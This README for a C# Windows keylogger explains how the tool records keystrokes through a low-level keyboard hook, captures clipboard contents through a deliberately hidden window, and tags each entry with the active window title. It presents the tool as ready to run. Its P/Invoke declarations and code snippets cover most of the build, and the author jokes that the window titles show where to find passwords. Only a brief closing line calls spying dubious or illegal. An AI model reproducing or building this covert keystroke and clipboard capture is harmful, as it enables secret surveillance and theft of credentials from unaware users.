# Windows Hook Keylogger
The Internet is full of such stuff. So why not introduce to you another one? Go! This is another example of using Win32 API functions to hook some system messages.  
Just run it once to start listening to the keyboard and clipboard and writing all content into a text log file. Recording will stop the second time you execute it.  
## So what was it all for?
The format of the log file is convenient so that you can easily find the record you are looking for. For this, the entered text is saved taking into account upper and lower case letters, in accordance with the selected input language. When any other text will be copied to the clipboard, it will also be stored to the log file. Thus, you get readable text like "what you see is what you get", rather than just a list of pressed buttons, as most similar programs do. Last but not least, all records are titled with the date, time and the title of the window where it was taken from.  

## More details. TL;DR.
### Keyboard hook.
Listening to the keyboard is triggered by using the SetWindowsHookEx function.
The standard C declaration looks like this:
```c
HHOOK SetWindowsHookEx(      
    int idHook,
    HOOKPROC lpfn,
    HINSTANCE hMod,
    DWORD dwThreadId
);
```
But in .NET we don't have the types implemented in windows.h. To use the Win32 API in C #, you must declare it as extern library. 
```csharp
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
static extern IntPtr SetWindowsHookEx(int idHook, IntPtr lpfn, IntPtr hMod,
    uint dwThreadId);
```
Not bad for begining, but let's deal with the passed parameters to a function.  
- **idHook** specifies the type of hook procedure to be installed. This parameter can be one of the following values.  
```csharp
enum HookType
{
    WH_CALLWNDPROC = 4,
    WH_CALLWNDPROCRET = 12,
    WH_CBT = 5,
    WH_DEBUG = 9,
    WH_FOREGROUNDIDLE = 11,
    WH_GETMESSAGE = 3,
    WH_JOURNALPLAYBACK = 1,
    WH_JOURNALRECORD = 0,
    WH_KEYBOARD = 2,
    WH_KEYBOARD_LL = 13,
    WH_MOUSE = 7,
    WH_MOUSE_LL = 14,
    WH_MSGFILTER = -1,
    WH_SHELL = 10,
    WH_SYSMSGFILTER = 6
}
```
Of all the variety, only WH_KEYBOARD_LL is useful to us.
- **lpfn** is actually a pointer to a hook procedure in the code associated with the current process.  
```c 
HOOKPROC Hookproc;
LRESULT Hookproc(
       int code,
  [in] WPARAM wParam,
  [in] LPARAM lParam
)
```
However, enough C, we write here in C#. Let's translate!  
**wParam** is the identifier of the keyboard message, in this case it is defined by following enumeration: 
```csharp
public enum KeyEventType
{
    WM_KEYDOWN = 0x100,
    WM_KEYUP = 0x101,
    WM_SYSKEYDOWN = 0x104,
    WM_SYSKEYUP = 0x105
}
```
**lParam** is structure that contatins keyboard low level data:
```csharp
[Flags]
enum LowLevelKeyboardHookFlag
{
    LLKHF_EXTENDED = 0x1,
    LLKHF_LOWER_IL_INJECTED = 0x2,
    LLKHF_INJECTED = 0x10,
    LLKHF_ALTDOWN = 0x20,
    LLKHF_UP = 0x80
}
[StructLayout(LayoutKind.Sequential, Pack = 1)]
struct KeyboardLowLevelHookData
{
    public Keys vkCode;
    public char scanCode;
    public LowLevelKeyboardHookFlag flags;
    public int time;
    public IntPtr dwExtraInfo;
}
```
Hookproc
- **hMod** A DLL handle that contains the hook procedures pointed to by the **lpfn** parameter. the **hMod** parameter must be set to **null** if the dwThreadId parameter installs a thread created by the current process and if the hook procedure is inside code associated with the current process.  
- **dwThreadId** Specifies the thread identifier with which the hook procedure should be associated. If this parameter is zero, the hook procedure is associated with all existing threads running on the same desktop as the calling thread.  

According to the spec, calling another Win32 API function **CallNextHookEx** by the next procedure in the hook is optional, but highly recommended; otherwise, other applications that have installed hooks will not receive filter notifications and, as a result, may misbehave. You should call the **CallNextHookEx** function if you absolutely must not prevent notifications from being seen by other applications.  

Considering all of the above, replace our function declaration.
```csharp
delegate IntPtr LowLevelKeyboardProc(HookCode nCode, KeyEventType wParam,
    KeyboardLowLevelHookData lParam);
    
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
static extern IntPtr CallNextHookEx(IntPtr hhk, HookCode nCode, KeyEventType wParam,
    KeyboardLowLevelHookData lParam);

[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
static extern IntPtr SetWindowsHookEx(HookType idHook, LowLevelKeyboardProc lpfn, IntPtr hMod,
    uint dwThreadId);
```

To handle the KeyUp and KeyDown events, we define the LowLevelKeyboardEventArgs class that will contain all the keystroke parameters that are of most interest to us.  
```csharp
public class LowLevelKeyboardEventArgs
{
    private bool _suppressKeyPress;
    public LowLevelKeyboardEventArgs(Keys virtualKey)
    {
        VirtualKey = virtualKey;
    }
    public Keys VirtualKey { get; }
    public char ScanCode { get; set; }
    public LowLevelKeyboardHookFlag Flag { get; set; }
    public int Layout { get; set; }
    public string Text { get; set; }
    public virtual bool Alt { get; set; }
    public bool Control { get; set; }
    public virtual bool Shift { get; set; }
    public bool Handled { get; set; }
    public bool SuppressKeyPress
    {
        get => _suppressKeyPress;
        set
        {
            _suppressKeyPress = value;
            Handled = value;
        }
    }
}
delegate void LowLevelKeyEventHandler(object sender, LowLevelKeyboardEventArgs eventArgs);
event LowLevelKeyEventHandler KeyDown;
event LowLevelKeyEventHandler KeyUp;
```
Now you can start writing the callback function.
```csharp
IntPtr Callback(HookCode nCode, KeyEventType wParam, KeyboardLowLevelHookData lParam)
{
  // ... callback handling and event triggering
  // by the way, using here Win API function ToUnicodeEx is very helpfull 
  // for converting keystrokes to char symbol and logging the text as the user entered it. 
}
```
See the KeyboardHook.cs file for the complete implementation.
### Windows hook.
Just writing down all the text is good, but it would be nice idea to understand where it came from.  
To do this, it would be a good idea, firstly, to tie the entry in the log to the time it was written and, secondly, to determine the program with which the user was working. With the first, everything is obvious. With the second, everything is much more interesting. Through trial and error, a solution was obtained to set a "hook" to switch the user between windows and save the titles of these windows. Then it will immediately become clear where to look for ~~passwords~~ text.  
I put the word hook in quotes, because this functionality is not a hook in the literal sense and does not have a callback function. Instead, we'll have to take on the responsibility of watching change focus on foreground window.  
And the functions **GetForegroundWindow, GetWindowText, GetWindowTextLength** will help us in this.  
```csharp
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
public static extern int GetWindowTextLength(IntPtr hWnd);

[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int maxCount);

[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, SetLastError = true)]
public static extern IntPtr GetForegroundWindow();

struct WindowInfo
{
    public IntPtr Handle { get; set; }
    public string Text { get; set; }
    public ProcessInfo ProcessInfo { get; set; }

    public static bool operator ==(WindowInfo w1, WindowInfo w2)
    {
        return w1.Equals(w2);
    }

    public static bool operator !=(WindowInfo w1, WindowInfo w2)
    {
        return !w1.Equals(w2);
    }

    public override bool Equals(object obj)
    {
        if (obj is WindowInfo)
        {
            var windowInfo = (WindowInfo) obj;
            if (Handle == windowInfo.Handle) return Text == windowInfo.Text;

            return false;
        }

        return base.Equals(obj);
    }
}
```
Class WindowInfo contents methods for checking two state and returns false when user switch to another program or window title was changed. By comparing window infos of the top window at short intervals using a timer, we can track the user's activity.  
```csharp
Timer _timer = new Timer(100.0);
_timer.Elapsed += TimerOnElapsed;
_timer.Start();
WindowInfo ForegroundWindow;
void TimerOnElapsed(object sender, ElapsedEventArgs e)
{
    var windowInfo = GetWindowInfo(GetForegroundWindow());
    if (ForegroundWindow != windowInfo)
    {
        var eventArgs = new WindowTextChangeArgs(windowInfo.Text)
        {
            TimeStamp = e.SignalTime // this is a timestamp of window change event
        };
        WindowTextChanged?.Invoke(this, eventArgs);
    }

    ForegroundWindow = windowInfo;
}
```
See the WindowInfo.cs file for tdetails.
### Clipboard hook.
In order to subscribe to clipboard events, we need to create a windows form. Of course, our plans did not include disclosing our presence to the user, so we will not display the window, it will be hidden. To access the low-level capabilities of a window using the class **NativeWindow**. Among other things, the most noteworthy is the overload of the WndProc method to intercept the WM_DRAWCLIPBOARD and WM_CHANGECBCHAIN messages.  
```csharp
class ClipboardProc : NativeWindow
{
  protected override void WndProc(ref Message m)
  {
      switch (m.Msg)
      {
          case WM_DRAWCLIPBOARD:
          {
              // ... message handling
          }
          case WM_CHANGECBCHAIN:
          {
              // ... message handling
          }
          default:
              base.WndProc(ref m); // ... forwarding another messages along the chain
              break;
      }
  }
}
```
I will not go into detail, the details are in the file ClipboardHook.cs
### Signal transmission between processes.
To prevent duplicate launching the application, wherever you go to ask, you will be advised to use the mutex everywhere. But how about one launch to turn on the functionality, and the second to turn it off, and so on? Okay, okay, you can use a notorious mapped file, but why make it so difficult for yourself to read and write files if there is an easy solution in the Windows API? Ever heard of named events? It's time for this!
There is class NamedEvent and his four methods:
- **WaitForSingleObject** blocks the thread and waits until the specified object is in the signaled state or the time-out interval elapses.
- **PulseEvent** sets the specified event object to the signaled state and then resets it to the nonsignaled state after releasing the appropriate number of waiting threads.
- **SetEvent** sets the event to the signal state. In this case, all waiting threads are unblocked if the call **WaitForSingleObject**. Resetting an event that is already reset has no effect.
- **ResetEvent** resets the event back to its initial non-signaled state. 

```csharp
[DllImport("kernel32.dll")]
public static extern bool SetEvent([In] IntPtr hEvent);

[DllImport("kernel32.dll")]
public static extern bool ResetEvent([In] IntPtr hEvent);

[DllImport("kernel32.dll")]
public static extern bool PulseEvent([In] IntPtr hEvent);

[DllImport("kernel32", ExactSpelling = true, SetLastError = true)]
public static extern int WaitForSingleObject([In] IntPtr handle,
int milliseconds);
```
By using named events with a mutex, we can easily implement our plan.
So:
At first launch of the application it will create a mutex, enable all hooks and wait for the signaling event state.
At second launch the application, if the first instance is still running, it will detect the existing mutex and set the event to a signal state and exit without any actions.
```csharp
[STAThread] // STAThread is required for using named events!
static void Main()
{
    if (DuplicateLaunch.Default.Detect())
        NamedEvent.Deafult.Set();
    else
        Application.Run(new WinHookContext());
}
```
When the event is signaled, the first instance will be passed from **Wait** function down the chain until the **Application.Exit**. 
```csharp
public WinHookContext() // class initializer
{
    var thread = new Thread(ExitAppEventHandler);
    streamWriter = new StreamWriter(GetArchiveFileName(), true);
    wndHook.WindowTextChanged += WndHookOnWindowTextChanged;
    kbdHook.KeyUp += KbdHookOnKeyUp;
    clipHook.ClipBoardChanged += ClipHookOnClipBoardChanged;
    thread.Start(); // make a sound for start
    SystemSounds.Exclamation.Play();
}
private void ExitAppEventHandler() // event awaiter to start listening
{
    exitEvent.Wait();
    exitEvent.Reset();
    SystemSounds.Asterisk.Play(); // make a different sound to end listening
    Application.Exit();
}

```
For details see DuplicateLaunch.cs, NamedEvent.cs, Program.cs, WinHookContext.cs  
_______________
That's all this time. Now you know how to become a mommy cool-hacker!  
P.S. And don't forget that spying is a morally dubious idea and might even be illegal in your country!
